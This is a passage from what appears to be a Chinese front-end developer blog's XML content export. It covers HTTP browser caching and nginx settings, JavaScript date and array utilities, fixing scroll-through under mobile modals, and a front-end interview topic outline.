是内存中的缓存，(与之相对 disk cache 就是硬盘上的缓存)。按照操作系统的常理：先读内存，再读硬盘。 几乎所有的网络请求资源都会被浏览器自动加入到 memory cache 中。但是也正因为数量很大但是浏览器占用的内存不能无限扩大这样两个因素，memory cache 注定只能是个“短期存储”。常规情况下，浏览器的 TAB 关闭后该次浏览的 memory cache 便告失效 (为了给其他 TAB 腾出位置)。而如果极端情况下 (例如一个页面的缓存就占用了超级多的内存)，那可能在 TAB 没关闭之前，排在前面的缓存就已经失效了。 memory cache 机制保证了一个页面中如果有两个相同的请求 (例如两个 src 相同的 &lt;img&gt;，两个 href 相同的 &lt;link&gt;)都实际只会被请求最多一次，避免浪费。 在从 memory cache 获取缓存内容时，浏览器会忽视例如 max-age=0, no-cache 等头部配置。例如页面上存在几个相同 src 的图片，即便它们可能被设置为不缓存，但依然会从 memory cache 中读取。这是因为 memory cache 只是短期使用，大部分情况生命周期只有一次浏览而已。而 max-age=0 在语义上普遍被解读为“不要在下次浏览时使用”，所以和 memory cache 并不冲突。 不想让一个资源进入缓存，就连短期也不行，那就需要使用 no-store。存在这个头部配置的话，即便是 memory cache 也不会存储。 访问一个 memory cache 最后会标注为 from memory cache 注意：在firfox中是不区分 memory cache 和 disk cache 的，当浏览器访问已经缓存的资源时直接访问服务器，如果是304状态直接使用该资源。 Service Worker缓存 因为Service Worker是通过脚本执行的，为了用户体验可以浏览器加载完之后执行，也可以为了完美控制等待加载成功之后执行。Service Worker本身是为了webapp的离线存储，但是因为本身的兼容性不是很好，所以在常规缓存里面是不使用Service Worker的。 Service Worker 是将资源离线缓存，并且是永久性缓存，即关闭 TAB 或者浏览器，下次打开依然还在。 访问一个 Service Worker 缓存， 最后会标注为 from ServiceWorker 如果Service Worker缓存过多则会根据神秘规则删掉一部分，再请求资源时如果有memory cache或者disk cache切没过期则将不会请求网络，该部分请求资源规则同下面要讲的部分。但该请求最后还是会标注为 from ServiceWorker（待考证）。 想了解更多Service workder 可以访问讲解Service Worker使用的注册和清理 浏览器缓存未过期 当浏览器判断当前时间在 Expires 或者 Cache-control设置的缓存时间内，则浏览器认为缓存是有效的，将不访问服务器。 存在Service Worker缓存则优先访问Service Worker，Service Worker缓存过期的内容会访问 memory cache、 disk cache、 网络请求，但是最后都会标注为 from ServiceWorker（待考证）。 如果从 memory cache 获取，则最后会标注为 from memory cache。 如果从 disk cache 获取，则最后会标注为 from disk cache。 在浏览器判断过期与否有一个词叫新鲜度，里面提到驱逐算法用于将陈旧的资源（缓存副本）替换为新鲜的。 浏览器缓存过期 当浏览器判断当前时间在 Expires 或者 Cache-control设置的缓存时间之外，则浏览器认为缓存是无效的，将访问服务器，根据服务器返回的响应状态判断是否使用缓存。 当前可通过请求头关键字If-Modified-Since、If-None-Match 分别将上次请求响应头返回的 Last-Modified、 Etag 内容再次给到服务器进行对比，Etag的优先级比Last-Modified高。 Vary 服务器无变化 服务器返回的状态为304，表示服务器内容没变化，可继续使用该缓存。 服务器有变化 服务器返回的状态为200，表示服务器内容有变化，要使用请求返回的内容重新进行缓存。 Last-Modified &amp; If-Modified-Since Last-ModifiedIf-Modified-Since 服务器通过 Last-Modified 字段告知客户端，资源最后一次被修改的时间，例如 1 Last-Modified: Mon, 10 Nov 2018 09:10:11 GMT 浏览器将这个值和内容一起记录在缓存数据库中。 下一次请求相同资源时时，浏览器从自己的缓存中找出“不确定是否过期的”缓存。因此在请求头中将上次的 Last-Modified 的值写入到请求头的 If-Modified-Since 字段 服务器会将 If-Modified-Since 的值与 Last-Modified 字段进行对比。如果相等，则表示未修改，响应 304；反之，则表示修改了，响应 200 状态码，并返回数据。 但是他还是有一定缺陷的： 如果资源更新的速度是秒以下单位，那么该缓存是不能被使用的，因为它的时间单位最低是秒。 如果文件是通过服务器动态生成的，那么该方法的更新时间永远是生成的时间，尽管文件可能没有变化，所以起不到缓存的作用。 Etag &amp; If-None-Match EtagIf-None-Match 为了解决上述问题，出现了一组新的字段 Etag 和 If-None-Match Etag 存储的是文件的特殊标识(一般都是 hash 生成的)，服务器存储着文件的 Etag 字段。之后的流程和 Last-Modified一致，只是 Last-Modified 字段和它所表示的更新时间改变成了 Etag 字段和它所表示的文件 hash，把 If-Modified-Since 变成了 If-None-Match。服务器同样进行比较，命中返回 304, 不命中返回新资源和 200。 Etag 的优先级高于 Last-Modified分布式系统里多台机器间文件的 last-modified 必须保持一致，以免负载均衡到不同机器导致比对失败分布式系统尽量关闭掉Etag(每台机器生成的etag都会不一样)etag off;，如果依然想使用需要自行修改源码。分布式系统如果是动态内容则要开启 etag ，因为每次请求内容的 last-modified 都不一样 如何配置（nginx） nginx 配置浏览器缓存策略可以查看官方文档Module ngx_http_headers_module 官方例子 123456789 expires 30d;expires 24h;expires modified +24h;expires @24h;expires 0;expires -1;expires epoch;expires $expires;add_header Cache-Control private; 设置expires为具体的时间后会在响应头自动添加Cache-Control max-age=3600（秒数），如果是禁用缓存设置expires -1;的同时设置add_header Cache-Control no-cache 设置Cache-Control当为多个配置时可以写在一行，也可以写多行，但是不要冲突哦。Cache-Control值有很多（官方配置）请自行查看。 [Last-Modified &amp; If-Modified-Since] 这两个参数是服务器自动完成的，不需要配置。 当然也可以禁用Last-Modified。 etag 只是禁用和启用就可以 etag off; 或者 etag on; 在实际项目中使用缓存 web开发者发明了一种被 Steve Souders 称之为 revving 的技术[1] 。不频繁更新的文件会使用特定的命名方式：在URL后面（通常是文件名后面）会加上版本号。加上版本号后的资源就被视作一个完全新的独立的资源，同时拥有一年甚至更长的缓存过期时长。但是这么做也存在一个弊端，所有引用这个资源的地方都需要更新链接。web开发者们通常会采用自动化构建工具在实际工作中完成这些琐碎的工作。当低频更新的资源（js/css）变动了，只用在高频变动的资源文件（html）里做入口的改动。 这种方法还有一个好处：同时更新两个缓存资源不会造成部分缓存先更新而引起新旧文件内容不一致。对于互相有依赖关系的css和js文件，避免这种不一致性是非常重要的。 一个简单的例子可以查看vue-router history模式nginx配置并配置静态资源缓存 一些案例 具体的案例查看这里，查看其中的“一些案例” Manifest Manifest 作为 PWA 离线缓存的一部分，具体使用方法查看下相关文档 Web App ManifestHTML5 Cache Manifest Vary与内容协商 说了这么多缓存，我们也应该知道Vary，请移步Vary与内容协商 参考 HTTP 缓存一文读懂前端缓存一文读懂前端缓存 彻底理解浏览器的缓存机制你应该知道的浏览器缓存知识HTTP 消息头Service Worker API 服务工作线程 使用 Service WorkersCache网站渐进式增强体验(PWA)改造：Service Worker 应用详解Expires Cache-ControlLast-ModifiedIf-Modified-SinceEtag If-None-MatchVary]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>Cache</tag>
        <tag>缓存</tag>
        <tag>Expires</tag>
        <tag>Cache-control</tag>
        <tag>Last-Modified</tag>
        <tag>Etag</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[日期常用操作]]></title>
    <url>%2Fblob%2F2019-05-31-date-common-operations%2F</url>
    <content type="text"><![CDATA[本例主要包含了时间格式化、时间倒退显示、时分秒毫秒清零、获取这天日期、获取这周、获取这周的周一、获取这周的周日、获取这月、获取这月的第一天、获取这月的最后一天、获取这季、获取这季的第一天、获取这季的最后一天、获取这年、获取这年的第一天、获取这年的最后一天。 例子中代码也起到引导思路的作用，大家可以去改动，如果有好的用法可留言。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280 /** 对Date的扩展，将 Date 转化为指定格式的String * * 月(M)、日(d)、小时(h)、分(m)、秒(s)、季度(q) 可以用 1-2 个占位符， * * 年(y)可以用 1-4 个占位符，毫秒(S)只能用 1 个占位符(是 1-3 位的数字) * * 例子： * * format(new Date(), "yyyy-MM-dd hh:mm:ss.S") ==&gt; 2006-07-02 08:09:04.423 * * format(new Date(), "yyyy-M-d h:m:s.S") ==&gt; 2006-7-2 8:9:4.18 * */export const DateFormat = (date, fmt)=&gt;&#123; date = new Date(date); var o = &#123; "M+": date.getMonth() + 1, //月份 "d+": date.getDate(), //日 "h+": date.getHours(), //小时 "m+": date.getMinutes(), //分 "s+": date.getSeconds(), //秒 "q+": Math.floor((date.getMonth() + 3) / 3), //季度 "S": date.getMilliseconds() //毫秒 &#125;; if (/(y+)/.test(fmt)) fmt = fmt .replace(RegExp.$1, (date.getFullYear() + "") .substr(4 - RegExp.$1.length)); for (var k in o) if (new RegExp("(" + k + ")").test(fmt)) fmt = fmt .replace(RegExp.$1, (RegExp.$1.length == 1) ? (o[k]) : (("00" + o[k]) .substr(("" + o[k]).length))); return fmt;&#125;;/** 时间显示。几秒前、几分钟前、几小时前、昨天时间、前天时间、日期时间 * * DateShow(Date.now() + 179990000) ==&gt; 明天15:01 * * DateShow(Date.now() + 10000) ==&gt; 15:01 * * DateShow(Date.now() - 10000) ==&gt; 10秒前 * * DateShow(Date.now() - 120000) ==&gt; 2分钟前 * * DateShow(Date.now() - 1200000) ==&gt; 20分钟前 * * DateShow(Date.now() - 12000000) ==&gt; 3小时前 * * DateShow(Date.now() - 120000000) ==&gt; 昨天05:28 * * DateShow(Date.now() - 190000000) ==&gt; 前天10:01 * * DateShow(Date.now() - 1900000000)==&gt; 07-09 15:01 */export const DateShow = (date) =&gt; &#123; if(!date) return; let tomorrowBegin = new Date().setHours(0, 0, 0, 0) + 24 * 3600000 let dateNow = Date.now(); let todayBegin = new Date().setHours(0, 0, 0, 0); let yesterdayBegin = new Date().setHours(0, 0, 0, 0) - 24 * 3600000; let beforeYesterdayBegin = new Date().setHours(0, 0, 0, 0) - 24 * 3600000 * 2; let showDate = new Date(date).getTime(); if (showDate &gt; tomorrowBegin)&#123; return "明天" + DateFormat(showDate, 'hh:mm'); &#125;else if(showDate &gt; dateNow)&#123; return DateFormat(showDate, 'hh:mm'); &#125;else if (showDate &gt; todayBegin)&#123; if(dateNow - showDate &lt; 60000)&#123; return parseInt((dateNow - showDate) / 1000) + "秒前"; &#125;else if(dateNow - showDate &lt; 3600000)&#123; return parseInt((dateNow - showDate) / 60000) + "分钟前"; &#125;else&#123; return parseInt((dateNow - showDate) / 3600000) + "小时前"; &#125; &#125; else if (showDate &gt; yesterdayBegin)&#123; return "昨天" + DateFormat(showDate, 'hh:mm') &#125; else if (showDate &gt; beforeYesterdayBegin)&#123; return "前天" + DateFormat(showDate, 'hh:mm') &#125;else&#123; return DateFormat(showDate, 'MM-dd hh:mm') &#125;&#125;;// 修改时间的小时、分，修改秒、毫秒为0，并返回修改后的毫秒数export const DateSetTime = (date, timeString = '')=&gt;&#123; let _date = new Date(date); let times = timeString.split(":"); _date.setHours(parseInt(times[0]) || 0, parseInt(times[1]) || 0, 0, 0); return _date.getTime();&#125;;/** * @description 获取这天日期 * * @returns [格式化时间] */export const DateCurrent = (date, fmt = 'M月d日') =&gt; &#123; let _date = new Date(date || Date.now()) return [DateFormat(_date, fmt)]&#125;/** * @description 获取这周 * * @returns [格式化时间] */export const DateWeekCurrent = (date) =&gt; &#123; let _date = new Date(date || Date.now()) //获取星期几,getDay()返回值是 0（周日） 到 6（周六） 之间的一个整数。0||7为7，即weekday的值为1-7 const weekday = _date.getDay() || 7; //往前算（weekday-1）天，年份、月份会自动变化 _date.setDate(_date.getDate() - weekday + 1); return [weekday]&#125;/** * @description 获取这周的周一 * * @returns [格式化时间, 当天的零点时间毫秒数] */export const DateWeekFirst = (date, fmt = 'M月d日') =&gt; &#123; let _date = new Date(date || Date.now()) //获取星期几,getDay()返回值是 0（周日） 到 6（周六） 之间的一个整数。0||7为7，即weekday的值为1-7 const weekday = _date.getDay() || 7; //往前算（weekday-1）天，年份、月份会自动变化 _date.setDate(_date.getDate() - weekday + 1); return [DateFormat(_date, fmt), DateSetTime(_date)]&#125;/** * @description 获取这周的周日 * * @returns [格式化时间, 当天的零点时间毫秒数] */export const DateWeekLast = (date, fmt = 'M月d日') =&gt; &#123; let _date = new Date(date || Date.now()) //获取星期几,getDay()返回值是 0（周日） 到 6（周六） 之间的一个整数。0||7为7，即weekday的值为1-7 const weekday = _date.getDay() || 7; //往前算（7 - weekday）天，年份、月份会自动变化 _date.setDate(_date.getDate() + 7 - weekday); return [DateFormat(_date, fmt), DateSetTime(_date)]&#125;/** * @description 获取这月 * * @returns [格式化时间] */export const DateMonthCurrent = (date, fmt = 'yy年M月') =&gt; &#123; let _date = new Date(date || Date.now()) return [DateFormat(_date, fmt)]&#125;/** * @description 获取这月的第一天 * * @returns [格式化时间, 当天的零点时间毫秒数] */export const DateMonthFirst = (date, fmt = 'M月d日') =&gt; &#123; let _date = new Date(date || Date.now()) _date.setDate(1); return [DateFormat(_date, fmt), DateSetTime(_date)]&#125;/** * @description 获取这月的最后一天 * * @returns [格式化时间, 当天的零点时间毫秒数] */export const DateMonthLast = (date, fmt = 'M月d日') =&gt; &#123; let _date = new Date(date || Date.now()) _date.setMonth(_date.getMonth() + 1); _date.setDate(0); return [DateFormat(_date, fmt), DateSetTime(_date)]&#125;/** * @description 获取这季 * * @returns [格式化时间] */export const DateSeasonCurrent = (date, fmt = 'q') =&gt; &#123; let _date = new Date(date || Date.now()) return [DateFormat(_date, fmt)]&#125;/** * @description 获取这季的第一天 * * @returns [格式化时间, 当天的零点时间毫秒数] */export const DateSeasonFirst = (date, fmt = 'M月d日') =&gt; &#123; let _date = new Date(date || Date.now()) const month = _date.getMonth(); if (month &lt; 3) &#123; _date.setMonth(0); &#125; else if (2 &lt; month &amp;&amp; month &lt; 6) &#123; _date.setMonth(3); &#125; else if (5 &lt; month &amp;&amp; month &lt; 9) &#123; _date.setMonth(6); &#125; else if (8 &lt; month &amp;&amp; month &lt; 11) &#123; _date.setMonth(9); &#125; _date.setDate(1); return [DateFormat(_date, fmt), DateSetTime(_date)]&#125;/** * @description 获取这季的最后一天 * * @returns [格式化时间, 当天的零点时间毫秒数] */export const DateSeasonLast = (date, fmt = 'M月d日') =&gt; &#123; let _date = new Date(date || Date.now()) const month = _date.getMonth(); if (month &lt; 3) &#123; _date.setMonth(2); &#125; else if (2 &lt; month &amp;&amp; month &lt; 6) &#123; _date.setMonth(5); &#125; else if (5 &lt; month &amp;&amp; month &lt; 9) &#123; _date.setMonth(8); &#125; else if (8 &lt; month &amp;&amp; month &lt; 11) &#123; _date.setMonth(11); &#125; _date = new Date(DateMonthLast(_date)[1]) return [DateFormat(_date, fmt), DateSetTime(_date)]&#125;/** * @description 获取这年 * * @returns [格式化时间] */export const DateYearCurrent = (date, fmt = 'yy年') =&gt; &#123; let _date = new Date(date || Date.now()) return [DateFormat(_date, fmt)]&#125;/** * @description 获取这年的第一天 * * @returns [格式化时间, 当天的零点时间毫秒数] */export const DateYearFirst = (date, fmt = 'yy年M月d日') =&gt; &#123; let _date = new Date(date || Date.now()) // 一月 _date.setMonth(0); // 一日 _date.setDate(1); return [DateFormat(_date, fmt), DateSetTime(_date)]&#125;/** * @description 获取这年的最后一天 * * @returns [格式化时间, 当天的零点时间毫秒数] */export const DateYearLast = (date, fmt = 'yy年M月d日') =&gt; &#123; let _date = new Date(date || Date.now()) // 下一年 _date.setFullYear(_date.getFullYear() + 1); // 一月 _date.setMonth(0); // 前一天 _date.setDate(-1); return [DateFormat(_date, fmt), DateSetTime(_date)]&#125; 参考 https://www.cnblogs.com/wasabii/p/7756560.html]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Date</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端遮罩层上面滑动穿透问题]]></title>
    <url>%2Fblob%2F2019-05-28-sliding-penetration-problem-on-shield-layer-of-moving-end%2F</url>
    <content type="text"><![CDATA[今天在一个移动项目中遇到了一个问题，使用display: fixed设置了一个遮罩层，当上下滑动这个遮罩层到极限后后面的内容会跟着移动，开始以为是一个很简单的问题，没想到也是需要花点时间去试验各种方法。 在小程序中也是需要类似的解决方法。 阻止滚动条wheel事件 1234 handleWheel (e) &#123; e.stopPropagation() e.preventDefault()&#125; 1 &lt;div class="wrap" @wheel="handleWheel"&gt;&lt;/div&gt; 该方法在浏览器上是没问题的不会继续滚动，但是再移动端上根本不起作用，因为移动端使用的是touchstart touchmove touchend，而且touch事件还有另外一个问题，因为click事件在这三个事件之后会等待300ms来判断是否会做出双击屏幕之后才会触发。 设置为overflow: hidden 弹出遮罩层之后不想让后面的内容滚动，可以尝试在弹出的时候设置滚动元素overflow: hidden禁止其滚动，同时给html，body均添加一个overflow：hidden的属性，取消的时候恢复滚动，但是还是有问题，禁用之后滚动位置会滚动到顶部。 解决这个滚动到顶部的方法是记录当前的scrollTop，取消的时候在赋值给当前页面的scroll 弹出层的touchmove事件中调用preventDefault 123 modal.addEventListener('touchmove', function(e) &#123; e.preventDefault();&#125;, false); 这样用 js 阻止滚动后看起来效果不错了，但是也有一个缺点： 弹出层里不能有其它需要滚动的内容（如大段文字需要固定高度，显示滚动条也会被阻止） 完美解决方案 给不想让他滚动的内容使用如下css，使其不受滚动的影响同时也不需要控制其滚动事件，再控制其滚动位置达到完美解决的效果。 但是如果在vue中使用次方法，可能在路由变动的时候没有执行removclass导致body滚动效果有问题 12345 .modal-open &#123; position:fixed; height: 100%; width: 100%;&#125; 1234567891011121314151617181920 const ModalHelper = (function (bodyCls) &#123; let scrollTop return &#123; afterOpen () &#123; // 记录当前的滚动位置 scrollTop = document.scrollingElement.scrollTop // 使body脱离文档流 document.body.classList.add(bodyCls) // 把脱离文档流的body拉上去！否则页面会回到顶部！ document.body.style.top = `$&#123;-scrollTop&#125;px` &#125;, beforeClose () &#123; // body又回到了文档流中（我胡汉三又回来啦！） document.body.classList.remove(bodyCls) // 滚回到老地方 document.scrollingElement.scrollTop = scrollTop &#125;, &#125;&#125;)('modal-open') 参考 移动端滚动穿透问题Modal scrolling on mobile devices - what is the current state 解决小程序的遮罩层滚动穿透]]></content>
      <categories>
        <category>移动端</category>
      </categories>
      <tags>
        <tag>滑动穿透</tag>
        <tag>移动端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS数组高端玩法]]></title>
    <url>%2Fblob%2F2019-05-23-js-array-high-end-play-method%2F</url>
    <content type="text"><![CDATA[前言 本文主要从应用来讲数组api的一些骚操作;如一行代码扁平化n维数组、数组去重、求数组最大值、数组求和、排序、对象和数组的转化等；上面这些应用场景你可以用一行代码实现？ 1.扁平化n维数组 终极篇 1234 [1,[2,3]].flat(2) //[1,2,3][1,[2,3,[4,5]].flat(3) //[1,2,3,4,5][1,[2,3,[4,5]]].toString() //'1,2,3,4,5'[1[2,3,[4,5[...]].flat(Infinity) //[1,2,3,4...n] Array.flat(n)是ES10扁平数组的api,n表示维度,n值为Infinity时维度为无限大 开始篇 12345678 function flatten(arr) &#123; while(arr.some(item=&gt;Array.isArray(item))) &#123; arr = [].concat(...arr); &#125; return arr;&#125;flatten([1,[2,3]]) //[1,2,3]flatten([1,[2,3,[4,5]]) //[1,2,3,4,5] 实质是利用递归和数组合并方法concat实现扁平 2.去重 终极篇 12 Array.from(new Set([1,2,3,3,4,4])) //[1,2,3,4][...new Set([1,2,3,3,4,4])] //[1,2,3,4] set是ES6新出来的一种一种定义不重复数组的数据类型Array.from是将类数组转化为数组…是扩展运算符,将set里面的值转化为字符串 开始篇 1234567891011121314 Array.prototype.distinct = function()&#123; var arr = this, result = [], i, j, len = arr.length; for(i = 0; i &lt; len; i++)&#123; for(j = i + 1; j &lt; len; j++)&#123; if(arr[i] === arr[j])&#123; j = ++i; &#125; &#125; result.push(arr[i]); &#125; return result;&#125;[1,2,3,3,4,4].distinct(); //[1,2,3,4] 取新数组存值,循环两个数组值相比较 3.排序 终极篇 12 [1,2,3,4].sort((a, b) =&gt; a - b); // [1, 2,3,4],默认是升序[1,2,3,4].sort((a, b) =&gt; b - a); // [4,3,2,1] 降序 sort是js内置的排序方法,参数为一个函数 开始篇冒泡排序: 12345678910111213141516 Array.prototype.bubleSort=function () &#123; let arr=this, len = arr.length; for (let outer = len; outer &gt;= 2; outer--) &#123; for (let inner = 0; inner &lt;= outer - 1; inner++) &#123; if (arr[inner] &gt; arr[inner + 1]) &#123; //升序 [arr[inner], arr[inner + 1]] = [arr[inner + 1], arr[inner]]; console.log([arr[inner], arr[inner + 1]]); &#125; &#125; &#125; return arr;&#125;[1,2,3,4].bubleSort() //[1,2,3,4] 选择排序 1234567891011121314 Array.prototype.selectSort=function () &#123; let arr=this, len = arr.length; for (let i = 0, len = arr.length; i &lt; len; i++) &#123; for (let j = i, len = arr.length; j &lt; len; j++) &#123; if (arr[i] &gt; arr[j]) &#123; [arr[i], arr[j]] = [arr[j], arr[i]]; &#125; &#125; &#125; return arr;&#125;[1,2,3,4].selectSort() //[1,2,3,4] 4.最大值 终极篇 12345 Math.max(...[1,2,3,4]) //4Math.max.apply(this,[1,2,3,4]) //4[1,2,3,4].reduce( (prev, cur,curIndex,arr)=&gt; &#123; return Math.max(prev,cur);&#125;,0) //4 Math.max()是Math对象内置的方法,参数是字符串;reduce是ES5的数组api,参数有函数和默认初始值;函数有四个参数,pre(上一次的返回值),cur(当前值),curIndex(当前值索引),arr(当前数组) 开始篇先排序再取值 5.求和 终极篇 123 [1,2,3,4].reduce(function (prev, cur) &#123; return prev + cur;&#125;,0) //10 开始篇 123456789101112 function sum(arr) &#123; var len = arr.length; if(len == 0)&#123; return 0; &#125; else if (len == 1)&#123; return arr[0]; &#125; else &#123; return arr[0] + sum(arr.slice(1)); &#125;&#125;sum([1,2,3,4]) //10 利用slice截取改变数组,再利用递归求和 6.合并 终极篇 123 [1,2,3,4].concat([5,6]) //[1,2,3,4,5,6][...[1,2,3,4],...[4,5]] //[1,2,3,4,5,6][1,2,3,4].push.apply([1,2,3,4],[5,6]) //[1,2,3,4,5,6] 开始篇 12345 let arr=[1,2,3,4];[5,6].map(item=&gt;&#123; arr.push(item)&#125;)//arr值为[1,2,3,4,5,6],注意不能直接return出来,return后只会返回[5,6] 7.判断是否包含值 终极篇 1234 [1,2,3].includes(4) //false[1,2,3].indexOf(4) //-1 如果存在换回索引[1, 2, 3].find((item)=&gt;item===3)) //3 如果数组中无值返回undefined[1, 2, 3].findIndex((item)=&gt;item===3)) //2 如果数组中无值返回-1 includes(),find(),findIndex()是ES6的api 开始篇 123 [1,2,3].some(item=&gt;&#123; return item===3&#125;) //true 如果不包含返回false 8.类数组转化 终极篇 1234 Array.prototype.slice.call(arguments) //arguments是类数组(伪数组)Array.prototype.slice.apply(arguments)Array.from(arguments)[...arguments] 类数组:表示有length属性,但是不具备数组的方法call,apply:是改变slice里面的this指向arguments,所以arguments也可调用数组的方法Array.from是将类似数组或可迭代对象创建为数组…是将类数组扩展为字符串,再定义为数组 开始篇 123456789 Array.prototype.slice = function(start,end)&#123; var result = new Array(); start = start || 0; end = end || this.length; //this指向调用的对象，当用了call后，能够改变this的指向，也就是指向传进来的对象，这是关键 for(var i = start; i &lt; end; i++)&#123; result.push(this[i]); &#125; return result;&#125; 9.每一项设置值 终极篇 1 [1,2,3].fill(false) //[false,false,false] fill是ES6的方法 开始篇 1 [1,2,3].map(() =&gt; 0) 10.每一项是否满足 1 [1,2,3].every(item=&gt;&#123;return item&gt;2&#125;) //false every是ES5的api,每一项满足返回 true 11.有一项满足 1 [1,2,3].some(item=&gt;&#123;return item&gt;2&#125;) //true some是ES5的api,有一项满足返回 true 12.过滤数组 1 [1,2,3].filter(item=&gt;&#123;return item&gt;2&#125;) //[3] filter是ES5的api,返回满足添加的项的数组 13.对象和数组转化 1234 Object.keys(&#123;name:'张三',age:14&#125;) //['name','age']Object.values(&#123;name:'张三',age:14&#125;) //['张三',14]Object.entries(&#123;name:'张三',age:14&#125;) //[[name,'张三'],[age,14]]Object.fromEntries([name,'张三'],[age,14]) //ES10的api,Chrome不支持 , firebox输出&#123;name:'张三',age:14&#125; 结语 更多精彩请戳火狼前端小而全的知识归纳 作者：火狼https://segmentfault.com/a/1190000018549643]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试知识点目录整理]]></title>
    <url>%2Fblob%2F2019-05-23-catalogue-of-knowledge-points-in-front-end-interview%2F</url>
    <content type="text"><![CDATA[基本功考察 关于Html 1、html语义化标签的理解、结构化的理解；能否写出简洁的html结构；SEO优化。 2、h5中新增的属性，如自定义属性data、类名className等；新增表单元素；拖拽Drag。 3、h5中新增的API、修改的API、废弃的API稍作了解（离线存储、audio、video）。 关于CSS 1、CSS选择器（三大特性）。 2、BFC机制。 3、盒模型。 4、CSS模块化开发（封装）；SCSS和LESS的使用。 5、屏幕适配以及页面自适应。 6、CSS3中新增的选择器。 7、CSS3中新增的属性，transform、trasition、animation等。 关于布局 1、标准文档流（padding + margin + 负margin）+ 浮动float + 定位 left + right + top + bottom。 2、百分比布局：px单位用%num代替，占父级元素的百分比。 3、flex弹性布局：主轴、辅助轴的几个属性。 4、grid栅格布局：使用框架中的类名来替代，本质上还是百分比布局。 关于JS基础 1、变量数据类型及检测：基本 + 引用。 2、运算符：算术 + 条件 + 逻辑 + 位 + 短路、隐式转换等。 3、条件、循环、异常处理if、switch(){case xxx:}、try、catch、finally、throw。 4、函数定义、调用方式（apply、call、直接调用）；传参：实参给形参赋值。 5、字符串、数组、对象常用API。 6、正则表达式。 关于JS高级 1、作用域、作用域链、闭包。 2、原型、原型链、继承。 3、函数上下文、this指向。 4、js的运行机制、事件队列和循环。 5、Ajax原理、axios库。 6、同步、异步编程。 7、jQuery源码学习。 关于浏览器 1、浏览器的构成和运行机制。 2、浏览器内核。 3、浏览器交互：BOM和DOM相关webApi、监听事件。 4、浏览器缓存机制。 5、浏览器的渲染原理。 6、浏览器的安全性：跨域和攻击。 关于网络协议 1、HTTP协议。 2、cookie、session、token。 关于ES6语法 1、字符串、数组、对象扩展的api。 2、变量扩展：let、const解构赋值，块级作用域。 3、函数扩展：箭头函数默认参数、rest参数。 4、展开运算符、模板字符串。 5、set和map数据结构。 6、迭代器和生成器函数next和yield的理解。 7、proxy对象属性代理器：属性的读取（get）和设置（set）相关操作。 8、promise对象、异步编程的解决方案。 9、async + await：异步编程的终极方案promise + generator的语法糖。 10、class语法、构造函数的语法糖。 11、模块化编程export + import的导出和导入。 VUE基础 1、基本指令。 2、实例的属性和方法。 3、实例的生命周期。 4、组件基础：创建、注册、添加属性方法、套用等。 5、组件通信传值，父子、兄弟、跨级。 6、插槽slot等。 VUE高级 1、vue-router：搭建SPA 路由、组件的配置。 路由间的传值。 路由跳转。 路由的导航守卫。 记住在router.js和组件页面中的使用方式。 2、vuex：状态管理、数据仓库store 实例化仓库的5大属性的使用。 state、getters、mutations、actions、modules。 辅助函数mapState等，仓库中计算属性的映射、方便操作。 记住在store.js和组件中使用方式。 VUE深入、源码阅读 1、数据响应式原理。 2、virtual dom。 3、diff 算法。 4、nextTick等等。 工程能力考察 项目能力 1、vue-cli脚手架搭建和功能配置vue.config.js。 2、webpack的常用配置。 3、项目构建打包。 4、熟悉各类框架的文档。 5、UI框架：Bootstrap、MUI、Element-ui等。 6、常用的插件整理；整理一个自己插件库，封装自己的方法库、组件库。 7、常用的工具熟练度。 8、PC端和移动端开发注意事项。 9、经验总结：快速确定项目的技术选型。 10、坑点总结：项目遇到坑坑坑！ 11、项目中的性能优化记录（都是细节点，多记录）。 12、需求文档的理解，可以结合项目流程图、UML图。 13、问题解决能力：bug定位调试、查找文档、寻求他人。 14、记录习惯养成。 模块化、组件化开发能力 1、项目分类；各类文件整理、分类。 2、各类功能封装。 3、组件和功能模块的抽离、解耦、复用。 内功考察 面向对象的编程思想 1、类的抽象。 2、对象的封装、继承。 3、为了更好的去管理数据、分类数据，实现高内聚、低耦合。 设计模式 设计模式感觉也是将面向对象思想再度抽象成现实中某些特定模式。 数据结构和算法 1、学习常用的排序搜索算法、顺序表、链表、栈、队列、树、堆等。 2、考验你的抽象思维和数学功底。 3、将现实需求抽象成计算机代码的思维能力。 附加技能考察 学习能力 1、持续学习的态度——博客、笔记记录。 2、技术论坛活跃度高、问答多。 3、GitHub开源项目参与。 了解一门后端语言 1、python、node.js、php等。 2、数据库mysql、redis、mongodb；sql的操作语句、mongodb的操作语句、redis的操作语句。 3、node + express搭建本地服务等。 4、python + django + request + scrapy。 系统编程 1、Linux命令行操作、系统文件管理。 2、多任务、多线程、多进程、协程、并发、并行、串行、同步、异步等概念的理解。]]></content>
      <categories>
        <category>面试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[iOS Safari浏览器上 overflow scroll 元素无法滑动]]></title>
    <url>%2Fblob%2F2019-05-23-overflow-scroll-element-on-ios-safari-browser-cannot-slide%2F</url>
